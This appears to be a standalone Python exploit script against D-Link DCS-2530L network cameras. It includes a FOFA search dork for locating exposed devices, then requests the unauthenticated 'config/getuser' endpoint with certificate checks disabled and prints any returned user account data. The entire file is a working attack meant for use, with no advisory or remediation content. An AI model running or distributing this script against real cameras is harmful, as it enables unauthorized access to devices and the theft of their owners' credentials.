#!/usr/bin/python3
#Author 9527
#fofa dork: app="D_Link-DCS-2530L"

import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

if(len(sys.argv) < 2):
	print("UseAge: python3 exploit.py url")
	print("Example: python3 exploit https://192.168.1.2/")
	exit()

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

target = sys.argv[1]
payload = target + 'config/getuser?index=0'

headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36"
            }

print("Attacking the target............")
print("================================")

response = requests.get(payload,headers = headers,verify = False,timeout = 5)

if(response.status_code == 200 and 'name=' in response.text):
	print("[+]Target is vuln!")
	print(response.text)
else:
	print("[-]Target is not vuln!")